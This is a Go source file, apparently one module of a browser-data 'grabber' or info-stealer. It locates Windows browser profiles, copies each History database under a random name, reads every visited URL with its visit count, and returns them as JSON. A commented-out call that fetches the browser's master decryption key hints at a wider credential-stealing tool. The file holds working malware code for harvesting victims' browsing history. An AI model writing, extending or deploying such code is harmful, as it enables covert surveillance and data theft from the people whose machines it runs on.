package history

import (
	"database/sql"
	"encoding/json"
	"os"

	"example.com/grabber/browsers/util"
	_ "github.com/mattn/go-sqlite3"
)

type History struct {
	Url         string `json:"url"`
	Visit_count string `json:"visit_count"`
}

func Get() string {
	var history []History
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		//master_key := decryption.GetMasterKey(path + "\\Local State")
		for _, profile := range extraPaths {
			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
				continue
			}
			path = path + "\\" + profile
			copy_path := path + "\\History" + util.RandomName()
			util.CopyFileKDOT(path+"\\History", copy_path)
			db, err := sql.Open("sqlite3", copy_path)
			if err != nil {
				continue
			}
			defer db.Close()
			defer os.Remove(copy_path)

			row, err := db.Query("SELECT url, visit_count FROM urls")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var url string
				var visit_count string
				row.Scan(&url, &visit_count)
				history = append(history, History{url, visit_count})
			}
		}
	}
	jsonData, err := json.MarshalIndent(history, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
